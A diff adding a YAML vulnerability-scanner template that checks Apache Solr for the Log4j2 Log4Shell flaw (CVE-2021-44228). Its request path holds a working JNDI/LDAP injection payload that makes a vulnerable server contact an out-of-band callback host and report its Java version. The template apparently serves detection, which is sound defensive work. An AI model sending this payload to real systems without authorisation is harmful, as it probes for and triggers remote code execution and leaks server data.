@@ -1,0 +1,18 @@
+name: Apache_Solr_Log4j2CVE_2021_44228
+transport: http
+set: {}
+detail:
+  dock: APP="Solr"
+  product: Apache Log4j2 2.0-beta9 - 2.15.0
+  homepage: https://gobies.org/
+  impact: ''
+  description: Apache Log4j2是一个Java的日志组件，在特定的版本中由于其启用了lookup功能，从而导致产生远程代码执行漏洞。
+rules:
+  r1:
+    method: GET
+    path: /solr/admin/cores?action=$%7Bjndi:ldap://$%7Bsys:java.version%7D.amth5e.ceye.io%7D
+    follow_redirects: true
+    headers:
+      User-Agent: Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0
+    expression: response.status == 400 && response.body.bcontains(b'ldap')
+expression: r1()
